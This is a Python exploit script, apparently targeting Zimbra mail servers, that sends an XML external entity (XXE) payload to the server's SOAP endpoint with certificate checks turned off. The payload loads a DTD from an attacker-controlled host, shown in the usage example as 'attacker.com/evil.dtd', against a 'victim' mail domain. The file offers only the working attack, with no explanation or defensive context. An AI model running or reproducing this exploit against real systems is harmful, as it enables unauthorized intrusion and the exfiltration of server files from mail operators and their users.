import sys

import requests


if len(sys.argv) != 3:
    print("""
    Usage:
          python3 zimbra_xxe.py <target_url> <dtd_url>
    Example:
          python3 zimbra_xxe.py https://mail.victim.com/ http://attacker.com/evil.dtd""")
    sys.exit(0)

target_url = sys.argv[1]
dtd_url = sys.argv[2]

xml_payload = r"""<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xmlrootname [<!ENTITY % aaa SYSTEM "{0}">%aaa;%ccc;%ddd;]>""".format(dtd_url)

requests.packages.urllib3.disable_warnings()

try:
    headers = {
        'Content-Type': 'application/soap+xml; charset=utf-8',
        'Referer': target_url,
    }
    requests.post(url=target_url.rstrip('/') + '/service/soap/',
                  headers=headers,
                  data=xml_payload,
                  timeout=5.0,
                  verify=False)
    print('XXE Payload has been sent.')
except Exception as exc:
    print(exc)
